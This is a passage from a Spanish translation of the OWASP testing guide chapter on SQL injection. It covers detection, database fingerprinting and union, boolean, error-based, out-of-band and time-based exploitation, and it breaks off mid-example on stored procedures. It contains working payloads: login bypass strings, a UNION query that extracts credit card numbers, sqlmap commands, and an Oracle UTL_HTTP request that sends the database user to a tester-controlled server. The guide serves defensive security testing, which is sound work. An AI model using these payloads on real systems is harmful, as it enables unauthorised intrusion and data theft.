Inyección SQL

ID
WSTG-INJT-05

Resumen

Las pruebas de inyección SQL comprueban si es posible inyectar datos en una aplicación o sitio de modo que ejecute en la base de datos una consulta SQL controlada por el usuario. Los evaluadores encuentran una vulnerabilidad de inyección SQL si la aplicación utiliza la entrada del usuario para crear consultas SQL sin una validación de entrada adecuada. La explotación exitosa de esta clase de vulnerabilidad permite a un usuario no autorizado acceder a los datos de la base de datos o manipularlos, lo cual, por si aún no lo sabías, es bastante malo.

Un ataque de inyección SQL consiste en la inserción o "inyección" de una consulta SQL, parcial o completa, mediante los datos de entrada o transmitidos desde el cliente (navegador) a la aplicación web. Un ataque de inyección SQL exitoso puede leer datos sensibles de la base de datos, modificar sus datos (insertar, actualizar o eliminar), ejecutar operaciones de administración sobre la base de datos (como apagar el DBMS), recuperar el contenido de un archivo existente en el sistema de archivos del DBMS o escribir archivos en el sistema de archivos y, en algunos casos, emitir comandos al sistema operativo. Los ataques de inyección SQL son un tipo de ataque de inyección, en el que se inyectan comandos SQL en una entrada del plano de datos para afectar la ejecución de comandos SQL predefinidos.

En general, la forma en que las aplicaciones web construyen las sentencias SQL mezcla la sintaxis SQL escrita por los programadores con datos proporcionados por el usuario. Ejemplo:

select title, text from news where id=$id

En el ejemplo anterior, la variable $id contiene datos proporcionados por el usuario, mientras que el resto es la parte estática de SQL aportada por el programador, lo que hace dinámica la sentencia SQL.

Debido a la forma en que se construyó, el usuario puede suministrar una entrada manipulada para intentar que la sentencia SQL original ejecute otras acciones de su elección. El siguiente ejemplo ilustra los datos proporcionados por el usuario "10 or 1=1", que cambian la lógica de la sentencia SQL al modificar la cláusula WHERE añadiendo la condición "or 1=1".

select title, text from news where id=10 or 1=1

NOTA: Hay que tener cuidado al inyectar la condición OR 1=1 en una consulta SQL. Aunque esto puede ser inofensivo en el contexto inicial en el que se inyecta, es común que las aplicaciones usen los datos de una sola petición en varias consultas diferentes. Si la condición llega, por ejemplo, a una sentencia UPDATE o DELETE, puede producirse una pérdida accidental de datos.

Los ataques de inyección SQL pueden dividirse en las siguientes tres clases:

  • Inband: los datos se extraen usando el mismo canal que se utiliza para inyectar el código SQL. Es el ataque más directo, en el que los datos recuperados se presentan directamente en la página web de la aplicación.
  • Out-of-band: los datos se recuperan usando un canal diferente (por ejemplo, se genera y se envía al evaluador un correo electrónico con los resultados de la consulta).
  • Inferencial o ciego (blind): no hay una transferencia real de datos. Aun así, el evaluador puede reconstruir la información enviando peticiones particulares y observando el comportamiento resultante del servidor de la base de datos.

Un ataque de inyección SQL exitoso requiere que el atacante elabore una consulta SQL sintácticamente correcta. Si la aplicación devuelve un mensaje de error generado por una consulta incorrecta, para un atacante puede ser más fácil reconstruir la lógica de la consulta original y, por tanto, entender cómo realizar la inyección correctamente. Sin embargo, si la aplicación oculta los detalles del error, el evaluador debe ser capaz de aplicar ingeniería inversa a la lógica de la consulta original.

En cuanto a las técnicas para explotar fallos de inyección SQL, hay cinco técnicas comunes. Además, estas técnicas a veces pueden usarse de forma combinada (por ejemplo, operador union y out-of-band):

  • Operador Union: puede usarse cuando el fallo de inyección SQL ocurre en una sentencia SELECT, lo que permite combinar dos consultas en un único resultado o conjunto de resultados.
  • Booleana: usa condiciones booleanas para verificar si ciertas condiciones son verdaderas o falsas.
  • Basada en errores: esta técnica obliga a la base de datos a generar un error, dando al atacante o evaluador información con la que refinar su inyección.
  • Out-of-band: técnica utilizada para recuperar datos usando un canal diferente (por ejemplo, realizar una conexión HTTP para enviar los resultados a un servidor web).
  • Retardo de tiempo: usa comandos de la base de datos (por ejemplo, sleep) para retrasar las respuestas en consultas condicionales. Es útil cuando el atacante no obtiene ninguna respuesta (resultado, salida o error) de la aplicación.

Objetivos de la prueba

  • Identificar los puntos de inyección SQL.
  • Evaluar la gravedad de la inyección y el nivel de acceso que se puede lograr a través de ella.

Cómo probar

Técnicas de detección

El primer paso de esta prueba es entender cuándo la aplicación interactúa con un servidor de base de datos para acceder a algunos datos. Ejemplos típicos de casos en los que una aplicación necesita comunicarse con una base de datos incluyen:

  • Formularios de autenticación: cuando la autenticación se realiza mediante un formulario web, es probable que las credenciales del usuario se comprueben contra una base de datos que contiene todos los nombres de usuario y contraseñas (o, mejor, los hashes de las contraseñas).
  • Motores de búsqueda: la cadena enviada por el usuario podría usarse en una consulta SQL que extrae todos los registros relevantes de una base de datos.
  • Sitios de comercio electrónico: es muy probable que los productos y sus características (precio, descripción, disponibilidad, etc.) estén almacenados en una base de datos.

El evaluador tiene que hacer una lista de todos los campos de entrada cuyos valores podrían usarse para elaborar una consulta SQL, incluidos los campos ocultos de las peticiones POST, y luego probarlos por separado, intentando interferir con la consulta y generar un error. Hay que considerar también las cabeceras HTTP y las cookies.

La primera prueba suele consistir en añadir una comilla simple ' o un punto y coma ; al campo o parámetro bajo prueba. La primera se utiliza en SQL como terminador de cadena y, si la aplicación no la filtra, daría lugar a una consulta incorrecta. El segundo se utiliza para finalizar una sentencia SQL y, si no se filtra, también es probable que genere un error. La salida de un campo vulnerable podría parecerse a la siguiente (en este caso, en un Microsoft SQL Server):

Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the
character string ''.
/target/target.asp, line 113

También se pueden usar delimitadores de comentarios (-- o /* */, etc.) y otras palabras clave de SQL como AND y OR para intentar modificar la consulta. Una técnica muy simple pero que a veces sigue siendo eficaz consiste simplemente en insertar una cadena donde se espera un número, ya que podría generarse un error como el siguiente:

Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the
varchar value 'test' to a column of data type int.
/target/target.asp, line 113

Hay que monitorear todas las respuestas del servidor web y examinar el código fuente HTML/JavaScript. A veces el error está presente en ellos pero, por alguna razón (por ejemplo, un error de JavaScript, comentarios HTML, etc.), no se muestra al usuario. Un mensaje de error completo, como los de los ejemplos, proporciona al evaluador una gran cantidad de información para montar un ataque de inyección exitoso. Sin embargo, las aplicaciones a menudo no ofrecen tanto detalle: puede emitirse un simple '500 Server Error' o una página de error personalizada, lo que significa que hay que usar técnicas de inyección ciega. En cualquier caso, es muy importante probar cada campo por separado: solo una variable debe variar mientras todas las demás permanecen constantes, con el fin de entender con precisión qué parámetros son vulnerables y cuáles no.

Métodos estándar de pruebas de inyección SQL

Inyección SQL clásica

Considérese la siguiente consulta SQL:

SELECT * FROM Users WHERE Username='$username' AND Password='$password'

Una consulta similar se utiliza generalmente en la aplicación web para autenticar a un usuario. Si la consulta devuelve un valor, significa que dentro de la base de datos existe un usuario con ese conjunto de credenciales, y entonces se permite al usuario iniciar sesión en el sistema; de lo contrario, se deniega el acceso. Los valores de los campos de entrada se obtienen generalmente del usuario mediante un formulario web. Supongamos que insertamos los siguientes valores de Username y Password:

$username = 1' or '1' = '1

$password = 1' or '1' = '1

La consulta será:

SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'

NOTA: Hay que tener cuidado al inyectar la condición OR 1=1 en una consulta SQL. Aunque esto puede ser inofensivo en el contexto inicial en el que se inyecta, es común que las aplicaciones usen los datos de una sola petición en varias consultas diferentes. Si la condición llega, por ejemplo, a una sentencia UPDATE o DELETE, puede producirse una pérdida accidental de datos.

Si suponemos que los valores de los parámetros se envían al servidor mediante el método GET, y que el dominio del sitio vulnerable es www.example.com, la petición que realizaremos será:

https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1

Tras un breve análisis, notamos que la consulta devuelve un valor (o un conjunto de valores) porque la condición siempre es verdadera (OR 1=1). De esta forma, el sistema ha autenticado al usuario sin conocer el nombre de usuario ni la contraseña.

Nota: En algunos sistemas, la primera fila de una tabla de usuarios sería un usuario administrador. Este puede ser el perfil devuelto en algunos casos.

Otra consulta de ejemplo es la siguiente:

SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))

En este caso hay dos problemas, uno debido al uso de paréntesis y otro debido al uso de la función hash MD5. En primer lugar, resolvemos el problema de los paréntesis. Esto consiste simplemente en añadir algunos paréntesis de cierre hasta obtener una consulta correcta. Para resolver el segundo problema, intentamos evadir la segunda condición. Añadimos a nuestra consulta un símbolo final que indica que comienza un comentario. De esta forma, todo lo que sigue a dicho símbolo se considera un comentario. Cada DBMS tiene su propia sintaxis para los comentarios; sin embargo, un símbolo común para la gran mayoría de las bases de datos es /*. En Oracle, el símbolo es --. Dicho esto, los valores que usaremos como Username y Password son:

$username = 1' or '1' = '1'))/*

$password = foo

De esta forma, obtendremos la siguiente consulta:

SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))

(Debido a la inclusión de un delimitador de comentario en el valor de $username, la parte de la contraseña de la consulta será ignorada.)

La URL de la petición será:

https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo

Esto puede devolver algunos valores. A veces, el código de autenticación verifica que el número de registros o resultados devueltos sea exactamente igual a 1. En los ejemplos anteriores, esta situación sería difícil (en la base de datos solo hay un valor por usuario). Para sortear este problema, basta con insertar un comando SQL que imponga la condición de que el número de resultados devueltos debe ser uno (un registro devuelto). Para lograr este objetivo, usamos el operador LIMIT <num>, donde <num> es el número de resultados o registros que queremos que se devuelvan. Con respecto al ejemplo anterior, el valor de los campos Username y Password se modificará de la siguiente manera:

$username = 1' or '1' = '1')) LIMIT 1/*

$password = foo

De esta forma, creamos una petición como la siguiente:

https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;password=foo

Sentencia SELECT

Considérese la siguiente consulta SQL:

SELECT * FROM products WHERE id_product=$id_product

Considérese también la petición a un script que ejecuta la consulta anterior:

https://www.example.com/product.php?id=10

Cuando el evaluador prueba un valor válido (por ejemplo, 10 en este caso), la aplicación devolverá la descripción de un producto. Una buena forma de comprobar si la aplicación es vulnerable en este escenario es jugar con la lógica, usando los operadores AND y OR.

Considérese la petición:

https://www.example.com/product.php?id=10 AND 1=2

SELECT * FROM products WHERE id_product=10 AND 1=2

En este caso, probablemente la aplicación devolvería algún mensaje indicando que no hay contenido disponible, o una página en blanco. Entonces el evaluador puede enviar una sentencia verdadera y comprobar si hay un resultado válido:

https://www.example.com/product.php?id=10 AND 1=1

Consultas apiladas (Stacked Queries)

Dependiendo de la API que utilice la aplicación web y del DBMS (por ejemplo, PHP + PostgreSQL, ASP + SQL SERVER), puede ser posible ejecutar varias consultas en una sola llamada.

Considérese la siguiente consulta SQL:

SELECT * FROM products WHERE id_product=$id_product

Una forma de explotar el escenario anterior sería:

https://www.example.com/product.php?id=10; INSERT INTO users (…)

De esta manera es posible ejecutar muchas consultas seguidas e independientes de la primera consulta.

Identificación de la base de datos (fingerprinting)

Aunque el lenguaje SQL es un estándar, cada DBMS tiene sus peculiaridades y difiere de los demás en muchos aspectos, como los comandos especiales y las funciones para recuperar datos tales como los nombres de usuarios y bases de datos, las características, las líneas de comentarios, etc.

Cuando los evaluadores pasan a una explotación más avanzada de la inyección SQL, necesitan saber cuál es la base de datos de backend.

Errores devueltos por la aplicación

La primera forma de averiguar qué base de datos de backend se utiliza es observar el error devuelto por la aplicación. A continuación se muestran algunos ejemplos de mensajes de error:

MySql:

You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the
right syntax to use near '\'' at line 1

Un UNION SELECT completo con version() también puede ayudar a conocer la base de datos de backend.

SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1

Oracle:

ORA-00933: SQL command not properly ended

MS SQL Server:

Microsoft SQL Native Client error ‘80040e14’
Unclosed quotation mark after the character string

SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1

PostgreSQL:

Query failed: ERROR: syntax error at or near
"’" at character 56 in /www/site/test.php on line 121.

Si no hay mensaje de error o este es personalizado, el evaluador puede intentar inyectar en campos de cadena usando diversas técnicas de concatenación:

  • MySql: ‘test’ + ‘ing’
  • SQL Server: ‘test’ ‘ing’
  • Oracle: ‘test’||’ing’
  • PostgreSQL: ‘test’||’ing’

Técnicas de explotación

Técnica de explotación con Union

El operador UNION se utiliza en las inyecciones SQL para unir una consulta, forjada a propósito por el evaluador, con la consulta original. El resultado de la consulta forjada se unirá al resultado de la consulta original, lo que permite al evaluador obtener los valores de columnas de otras tablas. Supongamos, para nuestro ejemplo, que la consulta ejecutada por el servidor es la siguiente:

SELECT Name, Phone, Address FROM Users WHERE Id=$id

Estableceremos el siguiente valor de $id:

$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable

Tendremos la siguiente consulta:

SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable

Esta unirá el resultado de la consulta original con todos los números de tarjeta de crédito de la tabla CreditCardTable. La palabra clave ALL es necesaria para sortear las consultas que usan la palabra clave DISTINCT. Además, notamos que, aparte de los números de tarjeta de crédito, hemos seleccionado otros dos valores. Estos dos valores son necesarios porque las dos consultas deben tener el mismo número de parámetros o columnas para evitar un error de sintaxis.

El primer detalle que un evaluador necesita encontrar para explotar la vulnerabilidad de inyección SQL con esta técnica es el número correcto de columnas de la sentencia SELECT.

Para lograrlo, el evaluador puede usar la cláusula ORDER BY seguida de un número que indica la numeración de la columna de la base de datos seleccionada:

https://www.example.com/product.php?id=10 ORDER BY 10--

Si la consulta se ejecuta con éxito, el evaluador puede suponer en este ejemplo que hay 10 o más columnas en la sentencia SELECT. Si la consulta falla, entonces la consulta debe devolver menos de 10 columnas. Si hay un mensaje de error disponible, probablemente sería:

Unknown column '10' in 'order clause'

Después de que el evaluador averigüe el número de columnas, el siguiente paso es averiguar el tipo de las columnas. Suponiendo que hubiera 3 columnas en el ejemplo anterior, el evaluador podría probar cada tipo de columna, usando el valor NULL como ayuda:

https://www.example.com/product.php?id=10 UNION SELECT 1,null,null--

Si la consulta falla, el evaluador probablemente verá un mensaje como:

All cells in a column must have the same datatype

Si la consulta se ejecuta con éxito, la primera columna puede ser un entero. Entonces el evaluador puede avanzar y así sucesivamente:

https://www.example.com/product.php?id=10 UNION SELECT 1,1,null--

Tras la recopilación exitosa de información, dependiendo de la aplicación, puede que solo se muestre al evaluador el primer resultado, porque la aplicación trata únicamente la primera línea del conjunto de resultados. En este caso, es posible usar una cláusula LIMIT o el evaluador puede establecer un valor no válido, haciendo que solo la segunda consulta sea válida (suponiendo que no hay ninguna entrada en la base de datos con un ID igual a 99999):

https://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--

Técnica de explotación con Union oculta

Lo mejor es poder explotar una inyección SQL con la técnica union, porque se puede recuperar el resultado de la consulta en una sola petición.
Pero la mayoría de las inyecciones SQL en el mundo real son ciegas. Aun así, es posible convertir algunas de ellas en inyecciones basadas en union.

Identificación
Cualquiera de los siguientes métodos puede usarse para identificar estas inyecciones SQL:

  1. La consulta vulnerable devuelve datos, pero la inyección es ciega.
  2. La técnica ORDER BY funciona, pero no se puede lograr una inyección basada en union.

Causa raíz
La razón por la que no se pueden usar las técnicas habituales de Union es la complejidad de la consulta vulnerable. En la técnica Union, se comenta el resto de la consulta después del payload (carga útil) UNION. Esto está bien para consultas normales, pero en consultas más complicadas puede ser problemático. Si la primera parte de la consulta depende de la segunda, comentar el resto rompe la consulta original.

Escenario 1
La consulta vulnerable es una subconsulta y la consulta padre se encarga de devolver los datos.

SELECT 
  * 
FROM 
  customers 
WHERE 
  id IN (                 --\
    SELECT                   |
      DISTINCT customer_id   |
    FROM                     |
      orders                 |--> vulnerable query
    WHERE                    |
      cost > 200             |
  );                      --/
  • Problema: Si se inyecta un payload UNION, este no afecta a los datos devueltos, porque se está modificando la sección WHERE. De hecho, no se está añadiendo una consulta UNION a la consulta original.
  • Solución: Se necesita conocer la consulta que se ejecuta en el backend. Luego, crear el payload en función de ella. Esto significa cerrar los paréntesis abiertos o añadir las palabras clave adecuadas si es necesario.

Escenario 2
La consulta vulnerable contiene alias o declaraciones de variables.

SELECT 
  s1.user_id, 
  (                                                                                      --\
    CASE WHEN s2.user_id IS NOT NULL AND s2.sub_type = 'INJECTION_HERE' THEN 1 ELSE 0 END   |--> vulnerable query
  ) AS overlap                                                                           --/
FROM 
  subscriptions AS s1 
  LEFT JOIN subscriptions AS s2 ON s1.user_id != s2.user_id 
  AND s1.start_date <= s2.end_date 
  AND s1.end_date >= s2.start_date 
GROUP BY 
  s1.user_id
  • Problema: Se rompe la consulta al comentar el resto de la consulta original después del payload inyectado, porque algunos alias o variables quedan undefined (sin definir).
  • Solución: Se deben colocar las palabras clave o alias apropiados al comienzo del payload. De esta forma, la primera parte de la consulta original sigue siendo válida.

Escenario 3
El resultado de la consulta vulnerable se utiliza en una segunda consulta. La segunda consulta es la que devuelve los datos, no la primera.

<?php
// retrieves product ID based on product name
                            --\
$query1 = "SELECT              |
             id                |
           FROM                |
             products          |--> vulnerable query #1
           WHERE               |
             name = '$name'";  |
                            --/
$result1 = odbc_exec($conn, $query1);
// retrieves product's comments based on the product ID
                              --\
$query2 = "SELECT                |
             comments            |
           FROM                  |
             products            |--> vulnerable query #2
           WHERE                 |
             id = '$result1'";   |
                              --/
$result1 = odbc_exec($conn, $query2);
?>

  • Problema: Se puede añadir un payload UNION a la primera consulta, pero no afectará a los datos devueltos.

  • Solución: Se necesita inyectar en la segunda consulta. Por tanto, la entrada de la segunda consulta no debe estar sanitizada. Luego, hay que hacer que la primera consulta no devuelva datos. Ahora se añade una consulta UNION que devuelva el payload que se quiere inyectar en la segunda consulta.

    Ejemplo:
    La base del payload (lo que se inyecta en la primera consulta):

    ' AND 1 = 2 UNION SELECT "PAYLOAD" -- -

    El PAYLOAD es lo que se quiere inyectar en la segunda consulta:

    ' AND 1=2 UNION SELECT ...

    El payload final (tras reemplazar el PAYLOAD):

    ' AND 1 = 2 UNION SELECT "' AND 1=2 UNION SELECT ..." -- -
                          \________________________/
                                      ||
                                      \/
                               the payload that
                                gets injected
                             into the second query
\________________________________________________________/
                            ||
                            \/
 the actual query we inject into the vulnerable parameter

    La primera consulta tras la inyección:

    SELECT               --\
  id                    |
FROM                    |----> first query
  products              |
WHERE                   |
  name = 'abcd'      --/
  AND 1 = 2                                 --\
UNION                                          |----> injected payload (what gets injected into the second payload)
SELECT                                         |
  "' AND 1=2 UNION SELECT ... -- -" -- -'   --/

    La segunda consulta tras la inyección:

    SELECT            --\
  comments           |
FROM                 |----> second query
  products           |
WHERE                |
  id = ''         --/
  AND 1 = 2         --\ 
UNION                  |----> injected payload (the final UNION query that controls the returned data)
SELECT ... -- -'    --/

Escenario 4
El parámetro vulnerable se utiliza en varias consultas independientes.

<?php
//retrieving product details based on product ID
$query1 = "SELECT 
             name, 
             inserted, 
             size 
           FROM 
             products 
           WHERE 
             id = '$id'";
$result1 = odbc_exec($conn, $query1);
//retrieving product comments based on the product ID
$query2 = "SELECT 
             comments 
           FROM 
             products 
           WHERE 
             id = '$id'";
$result2 = odbc_exec($conn, $query2);
?>
  • Problema: Añadir una consulta UNION a la primera (o a la segunda) consulta no la rompe, pero puede romper la otra.
  • Solución: Depende de la estructura del código de la aplicación. Pero el primer paso es conocer la consulta original. La mayoría de las veces, estas inyecciones se basan en tiempo. Además, el payload basado en tiempo se inyecta en varias consultas, lo cual puede ser problemático.
    Por ejemplo, si se usa SQLMap, esta situación confunde a la herramienta y la salida se desordena, porque los retardos no serán los esperados.

Extracción de la consulta original
Como se ve, siempre es necesario conocer la consulta original para lograr una inyección basada en union.
Se puede recuperar la consulta original usando las tablas predeterminadas del DBMS:

DBMS Tabla
MySQL INFORMATION_SCHEMA.PROCESSLIST
PostgreSQL pg_stat_activity
Microsoft SQL Server sys.dm_exec_cached_plans
Oracle V$SQL

Automatización
Pasos para automatizar el flujo de trabajo:

  1. Extraer la consulta original usando SQLMap e inyección ciega.
  2. Construir un payload base de acuerdo con la consulta original y lograr la inyección basada en union.
  3. Automatizar la explotación de la inyección basada en union mediante una de estas opciones:
    • Especificar un marcador de punto de inyección personalizado (*)
    • Usar las opciones --prefix y --suffix.

Ejemplo:
Considérese el tercer escenario analizado anteriormente.
Suponemos que el DMBS es MySQL y que la primera y la segunda consultas devuelven solo una columna. Este puede ser el payload para extraer la versión de la base de datos:

' AND 1=2 UNION SELECT " ' AND 1=2 UNION SELECT @@version -- -" -- -

Así que la URL objetivo sería así:

https://example.org/search?query=abcd'+AND+1=2+UNION+SELECT+"+'AND 1=2+UNION+SELECT+@@version+--+-"+--+-

Automatización:

  • marcador de punto de inyección personalizado (*):

    sqlmap -u "https://example.org/search?query=abcd'AND 1=2 UNION SELECT \"*\"-- -"

  • Opciones --prefix y --suffix:

    sqlmap -u "https://example.org/search?query=abcd" --prefix="'AND 1=2 UNION SELECT \"" --suffix="\"-- -"

Técnica de explotación booleana

La técnica de explotación booleana es muy útil cuando el evaluador encuentra una situación de Blind SQL Injection, en la que no se sabe nada sobre el resultado de una operación. Por ejemplo, este comportamiento ocurre en casos en los que el programador ha creado una página de error personalizada que no revela nada sobre la estructura de la consulta o de la base de datos, ni devuelve ningún error SQL: puede devolver simplemente un HTTP 404 o 500, o una redirección del navegador.

Mediante métodos de inferencia es posible sortear este obstáculo y así lograr recuperar los valores de algunos campos deseados. Este método consiste en realizar una serie de consultas booleanas contra el servidor, observar las respuestas y, finalmente, deducir el significado de dichas respuestas. Consideramos, como siempre, el dominio www.example.com y suponemos que contiene un parámetro llamado id vulnerable a inyección SQL. Esto significa que al realizar la siguiente petición:

https://www.example.com/index.php?id=1'

Obtendremos una página con un mensaje de error personalizado, debido a un error sintáctico en la consulta. Suponemos que la consulta ejecutada en el servidor es:

SELECT field1, field2, field3 FROM Users WHERE Id='$Id'

Que es explotable mediante los métodos vistos anteriormente. Lo que queremos obtener son los valores del campo username. Las pruebas que ejecutaremos nos permitirán obtener el valor del campo username, extrayendo dicho valor carácter por carácter. Esto es posible mediante el uso de algunas funciones estándar, presentes en prácticamente todas las bases de datos. Para nuestro ejemplo, usaremos las siguientes pseudofunciones:

  • SUBSTRING (text, start, length): devuelve una subcadena que comienza en la posición "start" de text y de longitud "length". Si "start" es mayor que la longitud de text, la función devuelve un valor nulo.

  • ASCII (char): devuelve el valor ASCII del carácter de entrada. Se devuelve un valor nulo si char es 0.

  • LENGTH (text): devuelve el número de caracteres del texto de entrada.

Mediante estas funciones, ejecutaremos nuestras pruebas sobre el primer carácter y, cuando hayamos descubierto su valor, pasaremos al segundo y así sucesivamente, hasta haber descubierto el valor completo. Las pruebas aprovecharán la función SUBSTRING para seleccionar un solo carácter a la vez (seleccionar un único carácter significa imponer el parámetro length en 1), y la función ASCII para obtener el valor ASCII, de modo que podamos hacer una comparación numérica. Las comparaciones se harán con todos los valores de la tabla ASCII hasta encontrar el valor correcto. Como ejemplo, usaremos el siguiente valor para Id:

$Id=1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1

Eso crea la siguiente consulta (a partir de ahora, la llamaremos "consulta inferencial"):

SELECT field1, field2, field3 FROM Users WHERE Id='1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'

El ejemplo anterior devuelve un resultado si y solo si el primer carácter del campo username es igual al valor ASCII 97. Si obtenemos un valor falso, entonces incrementamos el índice de la tabla ASCII de 97 a 98 y repetimos la petición. Si en cambio obtenemos un valor verdadero, ponemos el índice de la tabla ASCII a cero y analizamos el siguiente carácter, modificando los parámetros de la función SUBSTRING. El problema es entender de qué manera podemos distinguir las pruebas que devuelven un valor verdadero de las que devuelven falso. Para ello, creamos una consulta que siempre devuelve falso. Esto es posible usando el siguiente valor para Id:

$Id=1' AND '1' = '2

Lo cual creará la siguiente consulta:

SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2'

La respuesta obtenida del servidor (es decir, código HTML) será el valor falso para nuestras pruebas. Esto basta para verificar si el valor obtenido de la ejecución de la consulta inferencial es igual al valor obtenido con la prueba ejecutada antes. A veces, este método no funciona. Si el servidor devuelve dos páginas diferentes como resultado de dos peticiones web consecutivas idénticas, no podremos discriminar el valor verdadero del falso. En estos casos particulares, es necesario usar filtros especiales que permitan eliminar el código que cambia entre las dos peticiones y obtener una plantilla. Posteriormente, para cada petición inferencial ejecutada, extraeremos la plantilla correspondiente de la respuesta usando la misma función, y haremos un control entre las dos plantillas para decidir el resultado de la prueba.

En la discusión anterior no hemos tratado el problema de determinar la condición de terminación de nuestras pruebas, es decir, cuándo debemos finalizar el procedimiento de inferencia. Una técnica para hacerlo utiliza una característica de la función SUBSTRING y de la función LENGTH. Cuando la prueba compara el carácter actual con el código ASCII 0 (es decir, el valor nulo) y la prueba devuelve el valor verdadero, entonces o bien hemos terminado el procedimiento de inferencia (hemos recorrido toda la cadena), o bien el valor que hemos analizado contiene el carácter nulo.

Insertaremos el siguiente valor para el campo Id:

$Id=1' OR LENGTH(username)=N AND '1' = '1

Donde N es el número de caracteres que hemos analizado hasta ahora (sin contar el valor nulo). La consulta será:

SELECT field1, field2, field3 FROM Users WHERE Id='1' OR LENGTH(username)=N AND '1' = '1'

La consulta devuelve verdadero o falso. Si obtenemos verdadero, hemos completado la inferencia y, por tanto, conocemos el valor del parámetro. Si obtenemos falso, significa que el carácter nulo está presente en el valor del parámetro, y debemos continuar analizando el siguiente parámetro hasta encontrar otro valor nulo.

El ataque de inyección SQL ciega necesita un gran volumen de consultas. Es posible que el evaluador necesite una herramienta automática para explotar la vulnerabilidad.

Técnica de explotación basada en errores

Una técnica de explotación basada en errores es útil cuando el evaluador, por alguna razón, no puede explotar la vulnerabilidad de inyección SQL con otras técnicas como UNION. La técnica basada en errores consiste en obligar a la base de datos a realizar alguna operación cuyo resultado será un error. El punto aquí es intentar extraer algunos datos de la base de datos y mostrarlos en el mensaje de error. Esta técnica de explotación puede ser diferente de un DBMS a otro (véase la sección específica de cada DBMS).

Considérese la siguiente consulta SQL:

SELECT * FROM products WHERE id_product=$id_product

Considérese también la petición a un script que ejecuta la consulta anterior:

https://www.example.com/product.php?id=10

La petición maliciosa sería (por ejemplo, en Oracle):

https://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--

En este ejemplo, el evaluador concatena el valor 10 con el resultado de la función UTL_INADDR.GET_HOST_NAME. Esta función de Oracle intentará devolver el nombre de host del parámetro que se le pasa, que es otra consulta, el nombre del usuario. Cuando la base de datos busca un nombre de host con el nombre del usuario de la base de datos, fallará y devolverá un mensaje de error como:

ORA-292257: host SCOTT unknown

Entonces el evaluador puede manipular el parámetro que se pasa a la función GET_HOST_NAME() y el resultado se mostrará en el mensaje de error.

Técnica de explotación out-of-band

Esta técnica es muy útil cuando el evaluador encuentra una situación de Blind SQL Injection, en la que no se sabe nada sobre el resultado de una operación. La técnica consiste en usar funciones del DBMS para realizar una conexión out-of-band y entregar los resultados de la consulta inyectada como parte de la petición al servidor del evaluador. Al igual que las técnicas basadas en errores, cada DBMS tiene sus propias funciones. Consúltense las secciones específicas de cada DBMS.

Considérese la siguiente consulta SQL:

SELECT * FROM products WHERE id_product=$id_product

Considérese también la petición a un script que ejecuta la consulta anterior:

https://www.example.com/product.php?id=10

La petición maliciosa sería:

https://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--

En este ejemplo, el evaluador concatena el valor 10 con el resultado de la función UTL_HTTP.request. Esta función de Oracle intentará conectarse a testerserver y realizar una petición HTTP GET que contiene lo devuelto por la consulta SELECT user FROM DUAL. El evaluador puede configurar un servidor web (por ejemplo, Apache) o usar la herramienta Netcat:

/home/tester/nc -nLp 80

GET /SCOTT HTTP/1.1
Host: testerserver.com
Connection: close

Técnica de explotación con retardo de tiempo

La técnica de explotación con retardo de tiempo es muy útil cuando el evaluador encuentra una situación de Blind SQL Injection, en la que no se sabe nada sobre el resultado de una operación. Esta técnica consiste en enviar una consulta inyectada y, en caso de que la condicional sea verdadera, el evaluador puede monitorear el tiempo que tarda el servidor en responder. Si hay un retardo, el evaluador puede suponer que el resultado de la consulta condicional es verdadero. Esta técnica de explotación puede ser diferente de un DBMS a otro (véase la sección específica de cada DBMS).

Considérese la siguiente consulta SQL:

SELECT * FROM products WHERE id_product=$id_product

Considérese también la petición a un script que ejecuta la consulta anterior:

https://www.example.com/product.php?id=10

La petición maliciosa sería (por ejemplo, MySql 5.x):

https://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--

En este ejemplo, el evaluador comprueba si la versión de MySql es 5.x o no, haciendo que el servidor retrase la respuesta 10 segundos. El evaluador puede aumentar el tiempo de retardo y monitorear las respuestas. Además, el evaluador no necesita esperar la respuesta. A veces puede establecer un valor muy alto (por ejemplo, 100) y cancelar la petición después de unos segundos.

Inyección en procedimientos almacenados

Al usar SQL dinámico dentro de un procedimiento almacenado, la aplicación debe sanitizar correctamente la entrada del usuario para eliminar el riesgo de inyección de código. Si no se sanitiza, el usuario podría introducir SQL malicioso que se ejecutará dentro del procedimiento almacenado.

Considérese el siguiente procedimiento almacenado de SQL Server:

Create procedure user_login @username varchar(20), @passwd varchar(20)
As
Declare @sqlstring varchar(250)
Set @sqlstring  = ‘
Select 1 from users
Where username = ‘ + @username + ‘ and passwd = ‘ + @passwd
exec(@sqlstring)
Go

Entrada del usuario:

anyusername or 1=1'
anypassword

Este procedimiento no sanitiza la entrada, por lo que permite que el valor de retorno muestre un registro existente con estos parámetros.

Este ejemplo puede parecer poco probable debido al uso de SQL dinámico para iniciar sesión a un usuario, pero considérese una consulta dinámica de reportes en la que el usuario selecciona las columnas que desea ver. El usuario podría insertar código malicioso en este escenario y comprometer los datos.

Considérese el siguiente procedimiento almacenado de SQL Server:

Create
procedure get_report @columnamelist varchar(7900)
As
